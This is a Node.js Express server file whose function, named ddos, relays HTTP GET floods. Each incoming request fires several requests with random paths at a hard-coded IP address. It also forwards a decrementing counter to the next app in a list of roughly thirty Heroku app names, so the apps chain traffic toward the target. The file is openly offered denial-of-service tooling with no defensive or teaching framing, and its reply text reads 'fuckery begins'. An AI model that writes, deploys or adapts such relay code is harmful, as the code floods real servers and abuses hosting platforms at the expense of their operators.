const http=require('http')
const express = require("express")
const hostname='0.0.0.0';
const port=process.env.PORT || 8021;
const app=express();
const server=http.createServer(app)
const listener=server.listen(port,hostname,()=>{console.log("Server spinned up on port "+listener.address().port)});
const botArray=["tatras4","tatras5","tatras6","tatras7","tatras8","tatras9","tatras10","tatras11","tatras12","tatras13","fadros","fedros","pytras","accalia","admetus","ethanio","caspas","thorax","thoru","fagona","fagrus","cypruss","gapris","tikana","takris","fadnavis","crocasa","rasmon","rassas","dasnoma","dhanisa"]
app.get("/",(req,res,next)=>{
if(parseInt(req.query.count)>0){
  const count=req.query.count
  const index=req.query.index;
  if((index+1)<=(botArray.length-1)){
ddos(botArray[(parseInt(req.query.index)+1)%botArray.length],index,count)}
for(i=0;i<4;i++){
ddos(null)
}}

console.log(req.query)
res.send("fuckery begins")

res.end()

})
// botArray.forEach((item)=>{
//   ddos(item)
// })
function ddos(item,index,count){
  var uril;
  if(!item){
    const extra=Math.random()
    uril='http://13.233.2.27:5000/'+extra
  }
    else {
      index=index+1;
      count=count-1;
      const query="index="+index+"&count="+count;
      uril="http://"+item+".herokuapp.com?"+query
    }

    // const uril="http://"+item+".herokuapp.com"
    // const uril='http://13.233.2.27:5000/'
    console.log(uril)
    http.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
        let pythonData = '';
      
        // A chunk of data has been recieved.
        resp.on('data', (chunk) => {
          pythonData += chunk;
        });
      
        // The whole response has been received. Print out the result.
        resp.on('end', () => {
          console.log(pythonData+item)
        });
      
      }).on("error", (err) => {
        console.log("Error: " + err.message);
      });
}